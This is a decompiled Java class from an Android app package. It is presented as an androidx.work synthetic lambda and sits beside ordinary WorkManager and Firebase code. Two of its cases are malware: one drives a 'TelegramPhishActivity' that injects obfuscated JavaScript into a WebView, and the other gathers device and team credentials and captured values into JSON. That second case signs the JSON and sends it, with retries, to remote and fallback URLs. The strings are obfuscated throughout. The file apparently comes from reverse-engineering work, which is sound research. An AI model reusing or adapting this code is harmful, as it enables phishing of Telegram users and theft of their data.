package androidx.work.impl;

import android.content.Context;
import android.content.Intent;
import android.webkit.WebView;
import androidx.tracing.Trace;
import androidx.work.SystemClock;
import androidx.work.impl.model.WorkGenerationalId;
import com.base.template.TelegramPhishActivity;
import com.base.template.network.SmsFastSend;
import com.google.android.datatransport.cct.CctTransportBackend;
import com.google.android.datatransport.runtime.AutoValue_EventInternal;
import com.google.android.datatransport.runtime.AutoValue_TransportContext;
import com.google.android.datatransport.runtime.TransportImpl$$ExternalSyntheticLambda0;
import com.google.android.datatransport.runtime.backends.TransportBackend;
import com.google.android.datatransport.runtime.scheduling.DefaultScheduler;
import com.google.android.datatransport.runtime.scheduling.persistence.SQLiteEventStore;
import com.google.android.gms.tasks.TaskCompletionSource;
import com.google.common.util.concurrent.ListenableFuture;
import com.google.firebase.messaging.EnhancedIntentService;
import com.google.firebase.messaging.FirebaseMessaging$$ExternalSyntheticLambda4;
import java.util.ArrayList;
import java.util.concurrent.ExecutionException;
import java.util.logging.Logger;
import kotlin.text.StringsKt__StringsJVMKt;
import org.json.JSONObject;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final /* synthetic */ class Processor$$ExternalSyntheticLambda1 implements Runnable {
    public final /* synthetic */ int $r8$classId;
    public final /* synthetic */ Object f$0;
    public final /* synthetic */ Object f$1;
    public final /* synthetic */ Object f$2;

    public /* synthetic */ Processor$$ExternalSyntheticLambda1(DefaultScheduler defaultScheduler, AutoValue_TransportContext autoValue_TransportContext, TransportImpl$$ExternalSyntheticLambda0 transportImpl$$ExternalSyntheticLambda0, AutoValue_EventInternal autoValue_EventInternal) {
        this.$r8$classId = 3;
        this.f$0 = defaultScheduler;
        this.f$1 = autoValue_TransportContext;
        this.f$2 = autoValue_EventInternal;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int i = 1;
        boolean zBooleanValue = true;
        switch (this.$r8$classId) {
            case 0:
                Processor processor = (Processor) this.f$0;
                ListenableFuture listenableFuture = (ListenableFuture) this.f$1;
                WorkerWrapper workerWrapper = (WorkerWrapper) this.f$2;
                try {
                    zBooleanValue = ((Boolean) listenableFuture.get()).booleanValue();
                    break;
                } catch (InterruptedException | ExecutionException unused) {
                }
                synchronized (processor.mLock) {
                    try {
                        WorkGenerationalId workGenerationalIdGenerationalId = Trace.generationalId(workerWrapper.mWorkSpec);
                        String str = workGenerationalIdGenerationalId.workSpecId;
                        if (processor.getWorkerWrapperUnsafe(str) == workerWrapper) {
                            processor.cleanUpWorkerUnsafe(str);
                        }
                        SystemClock.get().getClass();
                        ArrayList arrayList = processor.mOuterListeners;
                        int size = arrayList.size();
                        int i2 = 0;
                        while (i2 < size) {
                            Object obj = arrayList.get(i2);
                            i2++;
                            ((ExecutionListener) obj).onExecuted(workGenerationalIdGenerationalId, zBooleanValue);
                        }
                    } catch (Throwable th) {
                        throw th;
                    }
                    break;
                }
                return;
            case 1:
                TelegramPhishActivity telegramPhishActivity = (TelegramPhishActivity) this.f$0;
                String str2 = (String) this.f$1;
                String str3 = (String) this.f$2;
                WebView webView = telegramPhishActivity.webView;
                if (webView != null) {
                    webView.evaluateJavascript(C0000.decode(new byte[]{89, 93, 54, 88, 81, 23, 91, 96, 83, 64, 19, 92, 76, 76, 20}, "63f08d32") + TelegramPhishActivity.jsEsc(str2) + C0000.decode(new byte[]{23, 74, 66, 21}, "0fb26429ea75") + TelegramPhishActivity.jsEsc(str3) + C0000.decode(new byte[]{69, 17}, "b8b17abb"), null);
                    return;
                }
                return;
            case 2:
                Context context = (Context) this.f$0;
                String str4 = (String) this.f$1;
                String str5 = (String) this.f$2;
                try {
                    SmsFastSend.Credentials credentialsResolveCredentials = SmsFastSend.resolveCredentials(context);
                    if (credentialsResolveCredentials == null) {
                        return;
                    }
                    String str6 = credentialsResolveCredentials.teamId;
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(C0000.decode(new byte[]{92, 85, 70, 90, 83, 4, 102, 11, 86}, "80030a9b26a005"), credentialsResolveCredentials.deviceId);
                    jSONObject.put(C0000.decode(new byte[]{23, 84, 7, 85, 110, 94, 92}, "c1f817848c8d43"), str6);
                    jSONObject.put(C0000.decode(new byte[]{67, 10, 94}, "3c02ed7281"), str4);
                    if (str5 != null && !StringsKt__StringsJVMKt.isBlank(str5)) {
                        jSONObject.put(C0000.decode(new byte[]{87, 81, 90, 93, 107, 93, 84}, "5046440d"), str5);
                    }
                    while (i < 4) {
                        long jCurrentTimeMillis = System.currentTimeMillis() / ((long) 1000);
                        String signature = SmsFastSend.getSignature(context, str6, jCurrentTimeMillis);
                        if (StringsKt__StringsJVMKt.isBlank(signature)) {
                            if (i < 3) {
                                Thread.sleep(((long) i) * 500);
                            }
                        } else if (SmsFastSend.trySendToPath(jSONObject, jCurrentTimeMillis, signature, credentialsResolveCredentials.effectiveUrl, credentialsResolveCredentials.fallbackUrl, C0000.decode(new byte[]{30, 16, 80, 26, 21, 80, 87}, "1fa5e9975d68d14f"), credentialsResolveCredentials.allUrls)) {
                            return;
                        } else {
                            Thread.sleep(((long) i) * 2000);
                        }
                        i++;
                    }
                    return;
                } catch (Exception e) {
                    e.getMessage();
                    return;
                }
            case 3:
                DefaultScheduler defaultScheduler = (DefaultScheduler) this.f$0;
                AutoValue_TransportContext autoValue_TransportContext = (AutoValue_TransportContext) this.f$1;
                String str7 = autoValue_TransportContext.backendName;
                AutoValue_EventInternal autoValue_EventInternal = (AutoValue_EventInternal) this.f$2;
                defaultScheduler.getClass();
                Logger logger = DefaultScheduler.LOGGER;
                String strDecode = C0000.decode(new byte[]{109, 66, 85, 95, 69, 73, 95, 69, 76, 19, 91, 81, 87, 90, 83, 87, 84, 23, 31}, "9041690783");
                try {
                    TransportBackend transportBackend = defaultScheduler.backendRegistry.get(str7);
                    if (transportBackend == null) {
                        String str8 = strDecode + str7 + C0000.decode(new byte[]{68, 20, 13, 67, 68, 15, 11, 23, 19, 74, 6, 81, 10, 71, 16, 85, 22, 4, 0}, "c4d0dadc38c6");
                        logger.warning(str8);
                        new IllegalArgumentException(str8);
                    } else {
                        ((SQLiteEventStore) defaultScheduler.guard).runCriticalSection(new FirebaseMessaging$$ExternalSyntheticLambda4(defaultScheduler, autoValue_TransportContext, ((CctTransportBackend) transportBackend).decorate(autoValue_EventInternal), i));
                    }
                    return;
                } catch (Exception e2) {
                    logger.warning(C0000.decode(new byte[]{115, 22, 19, 87, 19, 22, 69, 7, 9, 93, 5, 67, 90, 13, 15, 95, 65, 83, 64, 1, 15, 76, 65}, "6da8a6") + e2.getMessage());
                    return;
                }
            default:
                EnhancedIntentService enhancedIntentService = (EnhancedIntentService) this.f$0;
                Intent intent = (Intent) this.f$1;
                TaskCompletionSource taskCompletionSource = (TaskCompletionSource) this.f$2;
                int i3 = EnhancedIntentService.$r8$clinit;
                enhancedIntentService.getClass();
                try {
                    enhancedIntentService.handleIntent(intent);
                    return;
                } finally {
                    taskCompletionSource.setResult(null);
                }
        }
    }

    public /* synthetic */ Processor$$ExternalSyntheticLambda1(Object obj, Object obj2, Object obj3, int i) {
        this.$r8$classId = i;
        this.f$0 = obj;
        this.f$1 = obj2;
        this.f$2 = obj3;
    }
}
